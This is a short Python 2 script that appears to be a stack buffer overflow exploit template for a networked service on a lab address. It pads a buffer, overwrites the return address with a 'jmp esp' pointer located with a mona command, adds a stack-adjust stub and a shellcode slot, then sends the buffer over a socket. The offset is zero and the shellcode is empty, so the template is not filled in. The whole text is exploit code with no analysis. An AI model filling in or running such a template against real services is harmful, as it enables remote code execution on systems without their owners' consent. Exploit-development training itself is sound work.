#!/usr/bin/python

import socket
import struct

RHOST = "192.168.56.101"
RPORT = 31337

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((RHOST, RPORT))

offset=0
total_len=1024
jmp_ptr_esp = 0x080414C3 # !mona jmp -r esp -cbp '\x00\x0A' - find address of jmp esp inside code

sub_esp_shell="\x83\xec\x10" # make place on stack for inital decoding process

# use shellcode below to trigger breakpoint inside debugger
# shellcode = "\xCC\xCC\xCC\xCC"
shellcode =  ""

buf = ""
buf += "A"*(offset-len(buf))
buf += struct.pack("<I",jmp_ptr_esp)
buf += sub_esp_shell
buf += shellcode
buf += "D"*(total_len-len(buf)) # trailing padding
buf += "\n"

s.send(buf)

print "Sent: {0}".format(buf)

data = s.recv(1024)

print "Received: {0}".format(data)
